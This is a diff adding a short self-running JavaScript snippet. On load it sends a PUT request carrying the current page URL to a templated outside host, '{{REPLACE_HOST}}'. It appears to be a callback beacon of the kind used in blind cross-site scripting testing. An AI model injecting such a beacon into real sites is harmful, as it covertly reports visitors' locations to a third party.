@@ -1,0 +1,11 @@
+(function() {
+var xhr = new XMLHttpRequest();
+var params="";
+xhr.open("PUT", "{{REPLACE_HOST}}/"+encodeURIComponent(window.location), true);
+xhr.onreadystatechange = function() {
+    if(this.readyState == 4) {
+        console.log("Done.");
+    }
+}
+xhr.send(params);
+})();
